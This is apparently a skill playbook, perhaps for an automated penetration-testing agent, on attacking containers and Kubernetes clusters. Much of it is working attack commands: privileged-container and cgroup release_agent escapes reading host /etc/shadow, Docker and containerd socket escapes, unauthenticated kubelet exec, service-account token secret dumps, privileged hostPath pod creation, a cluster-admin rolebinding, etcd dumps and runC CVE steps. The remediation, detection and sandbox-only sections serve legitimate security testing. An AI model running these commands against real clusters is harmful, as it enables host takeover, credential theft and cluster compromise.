# Container & Kubernetes Security — Skill Playbook

**Mitre ATT&CK ID:** T1611 (Escape to Host)
**OWASP Mapping:** OWASP Kubernetes Top 10 (K8S-2022) – Security Misconfiguration
**Severity:** Critical / High
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: container-kubernetes-v1
category: container-security
author: HiveBreach
mitre_attack_id: T1611
owasp_mapping:
  - K8S-2022
  - A05:2021-Security-Misconfiguration
tags:
  - container-security
  - kubernetes
  - container-escape
  - privilege-escalation
  - docker
  - kubelet
  - T1611
  - T1610
  - T1609
  - T1068
  - T1546
  - T1203
environments:
  - container
  - kubernetes
  - docker
  - cloud
verification_required: sandbox
```

---

## 1. Detection

Container and Kubernetes exploitation is a two-phase problem: first gain a foothold inside a container/pod, then pivot to container escape or cluster privilege escalation. Detection therefore splits into (1) identifying your current runtime context and (2) mapping the cluster attack surface.

### 1.1 Runtime Context Fingerprinting

Determine whether you are inside a container and what is exposed:

```bash
# Am I in a container? (cgroup mounts, docker env file, /proc/1 differs from host init)
cat /proc/1/cgroup | head -20
ls -la /.dockerenv 2>/dev/null && echo "Docker container"
ls -la /run/.containerenv 2>/dev/null && echo "Podman container"

# Current user and groups
id
cat /etc/os-release

# Effective capabilities (decode CapEff bits against capabilities(7))
grep Cap /proc/self/status

# Namespace isolation - are we in the host PID/network namespace?
ls -l /proc/1/ns/
readlink /proc/1/ns/pid 2>/dev/null
ps aux | wc -l        # high count => likely hostPID shared
cat /proc/self/uid_map

# Mounted host paths / sockets / secrets
mount | grep -vE "proc|sysfs|tmpfs|devpts|cgroup|mqueue|overlay"
ls -la /var/run/docker.sock /run/docker.sock /var/run/containerd.sock /run/containerd/containerd.sock 2>/dev/null
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null

# Environment secrets leakage
env | grep -iE "(secret|key|token|pass|api|kube)"
```

### 1.2 Kubernetes Attack Surface Mapping

From inside a pod, enumerate cluster reachability and RBAC:

```bash
# Service account token present?
ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# K8s API reachable via in-cluster DNS (kubernetes.default.svc)
cat /etc/resolv.conf
getent hosts kubernetes.default.svc 2>/dev/null

# Kubelet and API server reachable from the node network?
for p in 10250 10255 6443 2379 8443; do
  (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "localhost:$p open" ||
  (echo > /dev/tcp/10.0.0.1/$p) 2>/dev/null && echo "10.0.0.1:$p open"
done

# Host networking / hostPID / hostIPC on the pod?
hostname; cat /etc/hosts
```

### 1.3 Automated Detection

```bash
# kube-hunter - active and passive cluster exposure checks
kube-hunter --remote <kube-api-ip>
kube-hunter --cidr 10.10.0.0/16
kube-hunter --active

# kube-bench - CIS benchmark against a node (misconfig detection)
kube-bench run --targets node
kube-bench run --targets etcd,master

# kubescape - full cluster compliance + attack path scan
kubescape scan framework nsa --format json --output report.json
kubescape scan control all

# deepce - checks container for escape-ready conditions (runs detection checks)
./deepce.sh --check
```

---

## 2. Confirmation

Evidence-first: a finding is only confirmed when the exploit condition is proven with **R2 – deterministic proof**, not an unverified alert.

### 2.1 Confirm We Are Inside a Container

| Indicator | Meaning |
|---|---|
| `/.dockerenv` present | Docker container |
| `cat /proc/1/cgroup` shows `docker/...` or `kubepods/...` | Containerised |
| `mount` shows `overlay` root | Container overlay filesystem |
| PID 1 is `tini`/`pause`/app binary, not `systemd` | Container |

### 2.2 Confirm Escape Surface

Decode `CapEff` from `/proc/self/status`:

| Capability (bit) | Hex (31-bit mask) | Significance |
|---|---|---|
| `CAP_SYS_ADMIN` (21) | `0x200000` | cgroup v1 release_agent escape |
| `CAP_SYS_PTRACE` (19) | `0x80000` | ptrace host processes (hostPID) |
| `CAP_DAC_READ_SEARCH` (2) | `0x4` | read arbitrary host files |
| `CAP_NET_ADMIN` (12) | `0x1000` | network namespace manipulation |
| `CAP_SYS_MODULE` (16) | `0x10000` | kernel module load |
| All caps + `Seccomp: 0` + `NoNewPrivs: 0` | full mask | likely `--privileged` |

```bash
# Quick privileged check
[ "$(grep Seccomp /proc/self/status | awk '{print $2}')" = "0" ] && echo "seccomp disabled"
[ "$(grep CapEff /proc/self/status | awk '{print $2}')" = "0000003fffffffff" ] && echo "ALL CAPS => privileged"
```

Confirm each pivot with an independent check:
- Docker socket mounted → check it responds: `docker -H unix:///var/run/docker.sock info`
- hostPID → `nsenter --target 1 --pid --mount -- ls /` (read-only first)
- hostPath mount → verify a writable bind of `/`, `/etc`, `/var/run/docker.sock`
- Kubelet 10250 anonymous → `curl -sk https://<node>:10250/pods` returns JSON
- Kube API 6443 unauthenticated → `curl -sk https://<api>:6443/api/v1/namespaces` returns data without a token

### 2.3 Confidence Tiers

| Tier | Requirement |
|---|---|
| R0 | Unverified tool alert |
| R1 | Reproduced condition (capability/mount/socket present) |
| **R2** | **Deterministic proof: read-back of a host file or host process list, verified twice via different methods** |

Escape findings must reach R2 before reporting (e.g., write a marker file to the host path, then confirm it from the host namespace via a second, independent channel).

---

## 3. Exploitation

All techniques below are for authorised testing in sandbox environments only.

### 3.1 Privileged Container Escape

A `--privileged` container runs with all capabilities, disabled seccomp, and mounted host devices. Two canonical escapes:

**Mount host root via device:**
```bash
mkdir -p /mnt/host
# Find host root device from /proc/partitions (e.g. /dev/sda1)
fdisk -l 2>/dev/null || lsblk 2>/dev/null || cat /proc/partitions
mount /dev/sda1 /mnt/host
chroot /mnt/host sh -c "id && cat /etc/shadow"
```

**cgroup v1 release_agent escape (CAP_SYS_ADMIN):**
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\),.*/\1/p' /etc/mtab)
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/pwned.shadow" >> /cmd
chmod a+x /cmd
echo "$host_path/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Trigger: create a task in the cgroup; release_agent runs /cmd on the HOST
```

**nsenter (requires hostPID or shared pid namespace):**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
# If only the PID namespace is shared:
nsenter --target 1 --pid --mount -- sh
```

### 3.2 Docker Socket Escape (`/var/run/docker.sock` mounted)

The socket grants full Docker daemon control on the host. Do not `curl` bind-mount attacks only as last resort; prefer the Docker CLI if present:

```bash
# If docker CLI is present in the container:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# Raw API (no CLI): spawn a privileged container that bind-mounts the host root
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true,"Volumes":{"/host":{}}}' \
  http://localhost/v1.41/containers/create?name=escaper
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json | jq -r '.[0].Id')
curl -s --unix-socket /var/run/docker.sock -X POST \
  -d '{"cmd":["/bin/sh","-c","chroot /host cat /etc/shadow"]}' \
  -H "Content-Type: application/json" \
  "http://localhost/v1.41/containers/$CONTAINER_ID/exec" >/dev/null
# ...start exec, read output via exec/start with TTY stream
```

**containerd/CRI socket escape (`/run/containerd/containerd.sock`):**
```bash
# ctr (containerd CLI) on older clusters:
ctr -n k8s.io run --privileged --mount type=bind,src=/,dst=/host,options=rbind \
  docker.io/library/alpine:latest escape sh -c "chroot /host cat /etc/shadow"

# nerdctl on containerd clusters:
nerdctl --namespace k8s.io run --privileged -v /:/host --rm -it alpine chroot /host sh
```

### 3.3 CAP_SYS_ADMIN + cgroup escape (cgroup v1)

See §3.1. This is the classic documented escape (`capsh --print` to confirm `cap_sys_admin`). On cgroup v2 hosts, the `release_agent` path is unavailable; pivot instead to `CAP_SYS_ADMIN` + `unshare` + mount tricks, or host device mounts.

### 3.4 Vulnerable Runtimes (CVEs)

**runC CVE-2019-5736 (runC container escape):**
- Affects runC < 1.0.0-rc6 with `/proc/self/exe` overwrite via `memfd_create` + `/proc/self/fd` re-exec. Malicious container can overwrite the host runC binary and execute on the host when `docker exec` is used.
- PoC basis: `memfd_create` a payload, get runC's binary via `/proc/self/exe`, overwrite with the payload, trigger `docker exec` to write the payload into place.
- Requires the ability to create and run containers (or `docker exec` into an attacker container) — sandbox only.

**runc-leaky-vessels CVE-2024-21626 (runC file-descriptor escape):**
- Affects runC <= 1.1.11, builds in Docker/BuildKit, and Podman. A malicious `WORKDIR`/`process.cwd` set to `/proc/self/fd/<n>` (fd referencing the host filesystem in the build context or an open host dir) escapes to the host mount namespace.
- PoC variants:
  - Variant 1 (inside container): `cd /proc/self/fd/7` then read the host fs, e.g. `cat ../../../../../../etc/shadow`.
  - Variant 2 (buildkit build): `docker build` with `WORKDIR /proc/self/fd/7` in the Dockerfile.
  - Variant 3 (buildkit `RUN`): `RUN cat /proc/self/fd/7/../../../../etc/shadow`.
  - Variant 4 (runC/Podman `workingDir`).
- Detection: `runc --version` <= 1.1.11; confirm fd `7`/`8` reachable: `docker run --rm -it ubuntu bash -c "ls -la /proc/self/fd/7"`.

**Detection of runtime version:**
```bash
runc --version 2>/dev/null || (cat /proc/1/cgroup | grep -m1 . ; find / -name runc 2>/dev/null)
docker version --format '{{.Server.Version}}' 2>/dev/null
```

### 3.5 `/proc` Host Access Abuse

If `/proc` is mounted from the host (e.g. `hostPID: true` or `/proc/sys` writable):

```bash
# Read host process memory / cmdlines via hostPID
for p in $(ls /proc | grep -E '^[0-9]+$'); do
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done | grep -v "^$" | sort -u

# If /proc/sys is writable (privileged, rw mount): kernel.core_pattern host code exec
cat /proc/sys/kernel/core_pattern          # check write access
# Echo a host-absolute payload path as core_pattern, crash a host process -> payload runs on host
```

### 3.6 Kubernetes Attacks

#### Unauthenticated Kubelet (port 10250)

Kubelet with `--anonymous-auth=true` (and no authn webhook/authorization) exposes the runtime API:

```bash
curl -sk https://<NODE_IP>:10250/pods | jq '.items[].metadata.name'
curl -sk https://<NODE_IP>:10250/run/<namespace>/<pod>/<container> -X POST -d "cmd=id"
curl -sk https://<NODE_IP>:10250/exec/<namespace>/<pod>/<container> -d "cmd=id&tty=false"
# List pods, read their configmaps/secrets-ish pod specs, or exec RCE directly
```

#### Unauthenticated Kube-API (port 6443)

```bash
curl -sk https://<API_IP>:6443/version
curl -sk https://<API_IP>:6443/api/v1/namespaces        # no token required?
curl -sk https://<API_IP>:6443/api/v1/pods              # if allowed: full cluster read
# Legacy insecure port 8080 (deprecated) sometimes open unauthenticated
curl -s http://<API_IP>:8080/api/v1/namespaces
```

#### Service Account Token Abuse (weak RBAC)

```bash
# Token and namespace from inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc.cluster.local

# What can I do?
kubectl --token=$TOKEN auth can-i --list
kubectl --token=$TOKEN get secrets
kubectl --token=$TOKEN get pods -A

# If the SA can get secrets:
kubectl --token=$TOKEN get secrets -o jsonpath='{range .items[*]}{.metadata.name}: {.data}{"\n"}{end}'
kubectl --token=$TOKEN get secret <name> -o go-template='{{range $k,$v := .data}}{{$k}}: {{$v|base64decode}}{{"\n"}}{{end}}'

# Raw API equivalent
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/default/secrets"
```

#### Create Privileged Pod (RBAC allowing `create pods`)

```bash
cat <<EOF | kubectl --token=$TOKEN apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext:
      privileged: true
      capabilities:
        add: ["SYS_ADMIN"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF
kubectl --token=$TOKEN exec -it attacker -n default -- chroot /host sh
```

Escalate within the pod to node, then cluster: from a privileged pod you own the node; harvest node kubelet credentials (`/var/lib/kubelet/config.yaml`, bootstrap tokens) or the cloud provider node credential to reach the control plane.

#### kubectl exec Post-Exploitation

```bash
kubectl --token=$TOKEN exec -it <pod> -n <ns> -- sh
kubectl --token=$TOKEN cp /local/file <pod>:/tmp/ -n <ns>
kubectl --token=$TOKEN port-forward pod/<pod> 8080:80 -n <ns>
```

#### Helm Chart Misconfiguration

```bash
# Inspect rendered values/overrides (secrets stored in ConfigMap/values or as plain values)
helm get values <release> -n <ns>     # if helm access available
helm template --debug <chart> | grep -iE "(password|token|secret|key)"
# Common issues: .Values.imagePullSecrets committed to git, admin passwords as default
# values, hostPath mounts in chart templates, privileged containers enabled by default.
```

### 3.7 Pivot to Control Plane / etcd

```bash
# If etcd is exposed (2379) without auth (misconfig):
etcdctl --endpoints=https://<etcd>:2379 --insecure-skip-tls-verify get / --prefix --keys-only
# Dump cluster secrets/service account tokens from the etcd key-value store

# If you reach the API server node: check kubeconfigs on disk
ls /etc/kubernetes/*.conf /root/.kube/config 2>/dev/null
find / -name "*.kubeconfig" 2>/dev/null
```

---

## 4. Tool-Specific Guidance

### 4.1 kube-hunter (cluster exposure / vulnerability hunting)
```bash
kube-hunter --remote <KUBE_API_IP>        # test a single endpoint
kube-hunter --cidr 10.0.0.0/16            # test a CIDR range
kube-hunter --active                      # actively exploit findings (probe)
kube-hunter --log info --report json
```

### 4.2 kube-bench (CIS benchmark / misconfig)
```bash
kube-bench run --targets node            # CIS node controls
kube-bench run --targets etcd            # etcd hardening
kube-bench run --targets master,controlplane
kube-bench run --json --output kube-bench.json
```

### 4.3 peirates (Kubernetes attack toolkit — the go-to post-exploitation tool)
```bash
peirates                 # interactive menu after drop-in
peirates --explore
peirates --auth-method serviceaccount --service-account-token-path /var/run/secrets/kubernetes.io/serviceaccount/token
# Features: enumerate namespaces/secrets, list/steal SA tokens, impersonate,
# pod-create with privileged, escalate to cluster-admin via RBAC bindings.
```

### 4.4 kubectl (manual cluster control)
```bash
kubectl --token=$TOKEN --insecure-skip-tls-verify auth can-i --list
kubectl --token=$TOKEN get secrets,pods,clusterroles,rolebindings -A
kubectl --token=$TOKEN create rolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=default:default -n default
```

### 4.5 kubescape (compliance + attack-path scanning)
```bash
kubescape scan framework nsa,mitre --format json --output /tmp/kubescape.json
kubescape scan control "Privileged containers" 
kubescape scan framework nsa --severity-threshold high
```

### 4.6 trivy (image/CVE scanning)
```bash
trivy image alpine:latest --severity CRITICAL,HIGH
trivy image --input image.tar        # offline
trivy fs . --severity HIGH           # scan local dir
trivy repo --dependency-tree github.com/org/repo
```

### 4.7 falco (detection — runtime security, watch events, not for attack)
```bash
falco --version
# Alert rules that surface the techniques in this playbook:
# - "Launch Privileged Container"
# - "Launch Sensitive Mount Container"
# - "Create Symlink Over Sensitive Files"
# - "Reading sensitive file opened from /proc"
falco rule --list | grep -iE "privileged|mount|container"
```

### 4.8 deepce (container escape enumeration + exploitation)
```bash
./deepce.sh --check                     # enumerate escape conditions
./deepce.sh --no-exploit --stage 1      # recon only
./deepce.sh --install                   # copy into container for post-exploitation
# Note: some deepce paths are loud; use --check first for enumeration.
```

### 4.9 docker / ctr / nerdctl (escape via container runtime CLI)
```bash
docker -H unix:///var/run/docker.sock ps
ctr -n k8s.io containers list
nerdctl --namespace k8s.io ps
```

---

## 5. PoC Generation

Every finding must produce a reproducible Proof of Concept.

### PoC Template

```markdown
## Container/K8s Escape — [FINDING_ID]

**Entry point:** [pod / docker.sock / kubelet / kube-api / etcd]
**Vulnerable component:** [runc 1.1.11 / kubelet 1.28 / RBAC binding X]
**Technique:** [privileged / docker.sock / CAP_SYS_ADMIN cgroup / nsenter / CVE-2019-5736 / CVE-2024-21626]

### Commands
```bash
# Step 1 - confirm condition
grep Cap /proc/self/status; ls -la /var/run/docker.sock

# Step 2 - exploit
<exact commands used, with host marker file>

# Step 3 - proof (R2)
ls -la /host/tmp/PROOF_marker           # marker written from host namespace
```

### Evidence
- [Marker file path + content visible from container]
- [Host `/etc/shadow` or `/proc/1/cmdline` read-back]
- [kubelet 10250 response with pod names]
- [SA token RBAC `auth can-i --list` output]

### Impact
- Host filesystem read/write: YES/NO
- Host process / node compromise: YES/NO
- Cluster admin / all secrets: YES/NO
- Control plane (etcd/API) access: YES/NO
- CVE references: [CVE-2019-5736 / CVE-2024-21626 / ...]

### Remediation
- Drop `--privileged`, scope capabilities, enable seccomp/AppArmor
- Never mount `/var/run/docker.sock` into containers
- Restrict RBAC: least-privilege ServiceAccounts, deny `pods/exec`, `secrets`
- Disable kubelet `anonymous-auth`, use webhook/ABAC authz
- Harden etcd (client certs, TLS, firewall 2379)
- Enable runtime security monitoring (Falco) and image scanning (trivy)
- Update runC/CONTAINERD to patched versions (>=1.1.12 for CVE-2024-21626)

### Reproduction Steps
1. Start pod with `securityContext.privileged: true` in the sandbox cluster.
2. `mount /dev/sda1 /mnt/host && chroot /mnt/host id`
3. Write `PROOF_marker` to the host fs, confirm from a second pod/namespace.
```

---

## 6. Verification (Sandbox)

Container escapes **must** be verified locally. **Never against production clusters, cloud-hosted clusters, or any target without written authorisation.**

### Allowed Sandboxes
- Docker Desktop / standalone Docker daemon on a throwaway VM
- Kind (Kubernetes in Docker): `kind create cluster`
- minikube: `minikube start --driver=docker`
- k3s in a VM: `curl -sfL https://get.k3s.io | sh`
- kube-hunter/kube-bench against a local `kind`/`minikube` control plane

### Sandbox Checklist
- [ ] Escape recreated in isolated local cluster/VM with identical config
- [ ] Marker file proof (R2) — read back via two independent channels
- [ ] Impact scoped: no destructive writes, no host data altered beyond marker file
- [ ] No real credentials/tokens touched (use synthetic SA tokens)
- [ ] CVE PoCs run only against intentionally vulnerable pinned images (e.g. `runc` <= 1.1.11 in a dedicated VM)
- [ ] Network egress to the internet blocked during verification
- [ ] Cluster destroyed after the test (`kind delete cluster`, VM snapshot rollback)

### Prohibited Actions
- Escaping to a production or non-authorised host
- Persisting persistence mechanisms on the host/cloud
- Modifying cluster RBAC without explicit written scope
- Dumping full `secrets`/etcd data beyond what is needed for impact demonstration
- Exfiltrating real cloud credentials (`/var/lib/kubelet`, cloud metadata)

---

## 7. Container & Kubernetes Misconfiguration Reference

| Misconfiguration | Detection | Exploitation Impact | MITRE |
|---|---|---|---|
| `--privileged` container | `CapEff` all-set, seccomp 0 | Host root escape | T1611 |
| `/var/run/docker.sock` mounted | socket present in container | Daemon-level host RCE | T1611 |
| `CAP_SYS_ADMIN` (cgroup v1) | `CapEff` bit 21 | release_agent host exec | T1611 |
| `hostPID: true` | `ps aux` shows host procs | nsenter / proc memory read | T1611 |
| `hostNetwork: true` | eth0 = node IP, no `--pod` network | Kubelet/API/etcd lateral | T1609 |
| `hostPath` volume mounts | `/host` or `/` bind in `mount` | Host fs read/write | T1611 |
| `hostIPC: true` | `/dev/shm`/`/proc/sysvipc` shared | IPC shm tampering | T1611 |
| Image pull secrets in `imagePullSecrets` | readable SA secret | Registry credential theft | T1552 |
| kubelet `--anonymous-auth=true` | 10250 `/pods` returns JSON | Pod exec RCE | T1609 |
| Kube-API unauthenticated (6443/8080) | `/version` answers without token | Cluster takeover | T1610 |
| Loose RBAC (`get secrets`, `create pods`, `cluster-admin`) | `kubectl auth can-i --list` | Secret theft / privileged pod | T1610 |
| Privileged SCC / PSP policy | kube-bench / kube-hunter | Privileged pod creation | T1610 |
| etcd exposed on 2379 | TCP connect + `etcdctl get / --prefix` | Full cluster secret dump | T1609 |
| Default SA auto-mount + token in pod | token file exists | Lateral movement | T1610 |
| Weak/committed Helm values | `helm get values`, git history | Admin creds / secrets exposure | T1552 |
| runC <= 1.1.11 (CVE-2024-21626), <= rc6 (CVE-2019-5736) | `runc --version` | Runtime escape | T1068 |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1610 | Deploy Container | Primary — deploy malicious/privileged containers |
| T1609 | Container Administration Command | Kubelet exec, kubectl exec, etcd control |
| T1611 | Escape to Host | Primary — container → host namespace escape |
| T1068 | Exploitation for Privilege Escalation | runC CVEs, cap-based privilege escalation |
| T1546 | Event Triggered Execution | cgroup release_agent, core_pattern abuse |
| T1203 | Exploitation for Client Execution | Malicious container images / build context escape |
| T1505.003 | Web Shell (via escaped host) | Post-escape persistence |
| T1552.001 | Unsecured Credentials (files) | SA tokens, kubeconfigs, image pull secrets |
| T1005 | Data from Local System | Host `/etc/shadow`, kubelet pod specs |
| T1020 | Automated Exfiltration | Secret/etcd dump exfiltration |

---

## 9. References

- MITRE ATT&CK T1611 (Escape to Host): https://attack.mitre.org/techniques/T1611/
- MITRE ATT&CK T1610 (Deploy Container): https://attack.mitre.org/techniques/T1610/
- MITRE ATT&CK T1609 (Container Administration Command): https://attack.mitre.org/techniques/T1609/
- MITRE ATT&CK T1068: https://attack.mitre.org/techniques/T1068/
- MITRE ATT&CK T1546: https://attack.mitre.org/techniques/T1546/
- MITRE ATT&CK T1203: https://attack.mitre.org/techniques/T1203/
- HackTricks Docker Security: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
- HackTricks Kubernetes: https://book.hacktricks.xyz/network-services-pentesting/kubernetes-pentesting
- PayloadsAllTheThings Docker & Kubernetes: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Docker%20%26%20Kubernetes
- runC CVE-2019-5736: https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- runC Leaky Vessels CVE-2024-21626: https://nvd.nist.gov/vuln/detail/CVE-2024-21626
- OWASP Kubernetes Top 10 (K8S-2022): https://owasp.org/www-project-kubernetes-top-ten/
- kube-hunter: https://github.com/aquasecurity/kube-hunter
- kube-bench: https://github.com/aquasecurity/kube-bench
- kubescape: https://github.com/kubescape/kubescape
- peirates: https://github.com/inguardians/peirates
- deepce: https://github.com/stealthcopter/deepce
- trivy: https://github.com/aquasecurity/trivy
- Falco: https://falco.org/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
